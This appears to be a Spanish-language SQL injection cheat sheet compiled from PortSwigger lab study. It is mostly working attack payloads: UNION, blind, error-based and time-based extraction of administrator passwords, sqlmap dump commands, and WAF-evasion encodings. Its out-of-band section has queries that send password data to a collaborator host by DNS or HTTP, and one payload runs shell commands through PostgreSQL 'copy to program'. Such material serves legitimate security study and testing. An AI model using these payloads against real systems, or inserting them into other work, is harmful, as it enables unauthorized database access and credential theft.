
> Organizado de menor a mayor complejidad: primero detección, luego extracción, luego técnicas ciegas (blind), y por último evasión de filtros. Referencia oficial: [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

## 1. Detección rápida (¿hay inyección?)

Prueba estos payloads básicos en el parámetro. Si cambia el comportamiento (error, contenido distinto, delay), hay SQLi.

```sql
'
''
'--
' OR 1=1--
```

---

## 2. UNION-based (extracción directa de datos)

Se usa cuando la respuesta de la app **muestra datos en pantalla**. Requiere que sepas el número de columnas (`ORDER BY` o `UNION SELECT NULL,NULL...`).

```sql
' order by 10-- -

' union select group_concat(schema_name) from information_schema.schemata-- -

' union select group_concat(table_name) from information_schema.tables where table_schema='nombre'-- -

' union select group_concat(column_name) from information_schema.columns where table_name='nombre'-- -

' union select group_concat(user,pass) from db.table-- -

' UNION SELECT username_bvwtof || '~' || password_qbbxtg,'KEH' FROM users_tbmogf-- -
```

---

## 3. SQLi en Oracle (sintaxis distinta)

Oracle **no permite `SELECT` sin `FROM`**, por eso siempre se usa la tabla dummy `dual`.

**Identificar si es Oracle:**

```sql

'||(SELECT '')||'              -- da error
'||(SELECT '' FROM dual)||'    -- válido (confirma Oracle)
```

**Enumeración:**

```sql
UNION SELECT NULL,NULL FROM dual-- 

'+UNION+SELECT+table_name,NULL+FROM+all_tables--

'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
```

---

## 4. SQLMap – comandos útiles

```bash
# Uso básico: obtener DBMS
sqlmap -u '<url>' -p <parametro>

# Listar bases de datos
sqlmap -u '<url>' -p <parametro> --dbs

# Listar tablas de una BD
sqlmap -u '<url>' -p <parametro> -D <nombre_bd> --tables

# Listar columnas de una tabla
sqlmap -u '<url>' -p <parametro> -D <nombre_bd> -T <tabla> --columns

# Query SQL personalizada (ej: Oracle con esquema)
sqlmap -u '<url>' -p <parametro> --sql-query "SELECT USERNAME_LASZLI, PASSWORD_GLJIEZ FROM PETER.USERS_NYXISJ"

# Con cookies + fuerza (labs PortSwigger)
sqlmap -u '<url>' --cookie="_lab=<...>; session=<...>" --batch --risk 3 --level 5 --dbms=postgresql --dbs

sqlmap -u '<url>' --cookie='TrackingId=<...>; session=<...>' -p TrackingId --level 2

sqlmap -u '<url>' --cookie='<param>=<valor>' --random-agent -p order --level 5 --risk 1 --batch --dbms='postgresql'
```

ejemplo 
```shell
# 1. Detectar
sqlmap -u "https://target/filter?category=*" -p category --cookie="..." --batch --risk=3 --level=5

# 2. Bases/Schemas
sqlmap ... --dbs

# 3. Tablas
sqlmap ... -D public --tables

# 4. Columnas
sqlmap ... -D public -T users --columns

# 5. Dump
sqlmap ... -D public -T users --dump

```
**Resumen del flujo lógico de sqlmap:**

1. `-u` → detectar tipo de BD
2. `--dbs` → nombres de bases de datos
3. `-D x --tables` → tablas de la BD `x`
4. `-D x -T y --columns` → columnas de la tabla `y`
5. `--sql-query "..."` → query manual final

---

## 5. Blind SQLi – Conditional Responses (booleana, sin errores)

Se usa cuando la app **no muestra errores ni datos**, pero cambia visualmente (ej: aparece o no un mensaje "Welcome back").

```sql
-- Confirmar que la condición controla la respuesta:
xyz' AND 1=2--          -- el mensaje desaparece

-- Confirmar tabla users:
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a

-- Confirmar usuario admin:
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

-- Ver longitud de password:
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

-- Fuerza bruta carácter a carácter (usar Intruder → Cluster bomb):
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

---

## 6. Blind SQLi – Conditional Errors

Aquí la app no te dice nada visualmente, pero **lanza error 500 si la condición es verdadera** (o falsa, según el caso). Sirve para Oracle principalmente.

```sql
-- Paso 1: confirmar que puedes provocar errores
'                                       -- error
''                                      -- sin error
'||(SELECT '')||'                      -- error
'||(SELECT '' FROM dual)||'            -- sin error (Oracle)
'||(SELECT '' FROM not-a-real-table)||'-- error

-- Paso 2: confirmar existencia de tabla users
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'

-- Paso 3: controlar el error según condición (división por cero)
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   -- error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'   -- sin error

-- Paso 4: confirmar usuario admin
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Paso 5: longitud del password
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- Paso 6: fuerza bruta carácter a carácter (Cluster bomb: posición + letra)
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

---

## 7. Errores visibles (Error-based, con CAST)

Cuando la app **muestra el mensaje de error de la BD** directamente en pantalla, puedes forzar que ese error contenga los datos que buscas.

```sql
'                                                      -- error con la query SQL visible
'--                                                     -- sin error
' AND CAST((SELECT 1) AS int)--                         -- error: AND debe ser booleano
' AND 1=CAST((SELECT 1) AS int)--                        -- sin error

-- Extraer datos dentro del mensaje de error:
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--   -- muestra "administrator"
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--   -- muestra el password
```

---

## 8. Time-based Blind (por retardo de tiempo)

Cuando no hay diferencias visibles ni errores, pero puedes medir el **tiempo de respuesta**.

📖 Referencia extra: [Blind SQLi Cheatsheet](https://ansar0047.medium.com/blind-sql-injection-detection-and-exploitation-cheatsheet-17995a98fed1)

### PostgreSQL

```sql
'||pg_sleep(10)--
';SELECT pg_sleep(5);--

-- Con condición (usar Cluster bomb para fuerza bruta):
';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--

';SELECT CASE WHEN (LENGTH(password) > 5) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--


';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

### MySQL

```sql
'SELECT SLEEP(20)--
'||SLEEP(20)--
';SELECT SLEEP(20)--
'UNION+SELECT SLEEP(20)--
```

### Oracle

```sql
' dbms_pipe.receive_message(('a'),20)--
'UNION SELECT dbms_pipe.receive_message(('a'),20)--
```

### MSSQL

```sql
' WAITFOR DELAY '0:0:20'--
'; WAITFOR DELAY '0:0:20'--
' UNION WAITFOR DELAY '0:0:20'--
```

---

## 9. Out-of-Band (OOB) / Fuera de banda

Se usa cuando **no hay ninguna señal visible** (ni error, ni delay útil). Necesitas Burp Collaborator para detectar la llamada DNS/HTTP saliente.

Requiere que la BD tenga habilitada la funcionalidad de red saliente (más común en Oracle/MSSQL).

### Oracle

```sql
-- Vía XXE (versiones antiguas/no parcheadas):
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

-- Vía UTL_INADDR (requiere privilegios elevados, funciona en versiones parcheadas):
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

### Microsoft SQL Server

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

### PostgreSQL

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

### MySQL (solo Windows)

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

### OOB con exfiltración de datos (Oracle, ejemplo)

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Microsoft (con variable):**

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

**PostgreSQL (con función):**

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

---

## 10. Evasión de filtros / WAF (Hackvertor)

Cuando el payload se bloquea por un filtro o WAF, se puede codificar en el request usando la extensión **Hackvertor**, probando distintos encodings en el body.

```
Normal (bloqueado):
UNION SELECT NULL   → "attack detected"

Con hex_entities (Hackvertor):
<@hex_entities>UNION SELECT NULL<@/hex_entities>
<@hex_entities>UNION SELECT schema_name FROM information_schema.schemata<@/hex_entities>
<@hex_entities>UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'<@/hex_entities>
<@hex_entities>UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'<@/hex_entities>
<@hex_entities>UNION SELECT password FROM public.users WHERE username='administrator'<@/hex_entities>
```

Tip: prueba distintos tipos de entidad (`hex_entities`, `html_entities`, `url_encode`, etc.) hasta encontrar uno que el WAF no detecte.

---

## 11. Lista rápida de detección (fuzzing masivo con Intruder)

### MySQL

```
sleep(5)#
1 or sleep(5)#
' or sleep(5)#
" or sleep(5)="
') or sleep(5)='
")) or sleep(5)="
benchmark(10000000,MD5(1))#
' or benchmark(10000000,MD5(1))#
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
```

### PostgreSQL

```
pg_sleep(5)--
' or pg_sleep(5)--
') or pg_sleep(5)--
```

### MSSQL

```
;waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
"));waitfor delay '0:0:5'--
```

### Genéricos / multi-motor

```
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)--
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

---


